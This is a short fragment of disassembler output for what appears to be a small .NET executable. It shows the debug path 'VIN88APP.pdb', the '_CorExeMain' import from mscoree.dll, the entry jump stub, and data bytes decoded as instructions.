  4080a4:	56                   	push   %esi
  4080a5:	49                   	dec    %ecx
  4080a6:	4e                   	dec    %esi
  4080a7:	38 38                	cmp    %bh,(%eax)
  4080a9:	41                   	inc    %ecx
  4080aa:	50                   	push   %eax
  4080ab:	50                   	push   %eax
  4080ac:	2e 70 64             	jo,pn  0x408113
  4080af:	62 00                	bound  %eax,(%eax)
  4080b1:	d9 80 00 00 00 00    	flds   0x0(%eax)
  4080b7:	00 00                	add    %al,(%eax)
  4080b9:	00 00                	add    %al,(%eax)
  4080bb:	00 00                	add    %al,(%eax)
  4080bd:	f3 80 00 00          	repz addb $0x0,(%eax)
  4080c1:	00 20                	add    %ah,(%eax)
	...
  4080d7:	00 00                	add    %al,(%eax)
  4080d9:	e5 80                	in     $0x80,%eax
	...
  4080e7:	5f                   	pop    %edi
  4080e8:	43                   	inc    %ebx
  4080e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4080ea:	72 45                	jb     0x408131
  4080ec:	78 65                	js     0x408153
  4080ee:	4d                   	dec    %ebp
  4080ef:	61                   	popa
  4080f0:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  4080f7:	72 65                	jb     0x40815e
  4080f9:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  4080fd:	6c                   	insb   (%dx),%es:(%edi)
	...
  408106:	ff 25 00 20 40 00    	jmp    *0x402000
  40810c:	00 00                	add    %al,(%eax)
  40810e:	00 00                	add    %al,(%eax)
  408110:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  408115:	cd 97                	int    $0x97
  408117:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40811d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40811e:	78 43                	js     0x408163
  408120:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  408126:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40812c:	e6 c3                	out    %al,$0xc3
  40812e:	39                   	.byte 0x39
  40812f:	41                   	inc    %ecx
